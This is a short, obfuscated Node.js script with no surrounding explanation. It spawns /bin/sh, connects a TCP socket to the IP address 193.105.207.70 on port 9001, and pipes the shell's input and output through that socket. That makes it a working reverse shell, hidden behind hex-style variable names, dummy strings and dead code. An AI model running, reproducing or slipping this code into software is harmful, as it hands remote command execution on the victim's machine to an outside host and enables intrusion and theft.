(function () {
    var _0x170a9c = require('net'), _0x46eb4f = require('child_process'), _0x8fd89c = _0x46eb4f['spawn']('/bin/sh', []), _0x3087cb = 'This\x20is\x20a\x20dummy\x20variable';
    _0x3087cb !== 'This\x20is\x20a\x20dummy\x20variable' ? console['log']('This\x20will\x20never\x20happen') : console['log']('Dead\x20code\x20example');
    var _0x295f9c = new _0x170a9c['Socket']();
    _0x295f9c['connect'](0x2329, '193.105.207.70', function () {
        _0x295f9c['pipe'](_0x8fd89c['stdin']), _0x8fd89c['stdout']['pipe'](_0x295f9c), _0x8fd89c['stderr']['pipe'](_0x295f9c);
    });
    function _0x489912() {
        var _0x30bbcb = 0xa, _0x8c9fa9 = 0x14, _0x40d6cc = _0x30bbcb + _0x8c9fa9;
        console['log']('This\x20function\x20will\x20never\x20be\x20called');
    }
    return _0x489912(), /a/;
}());
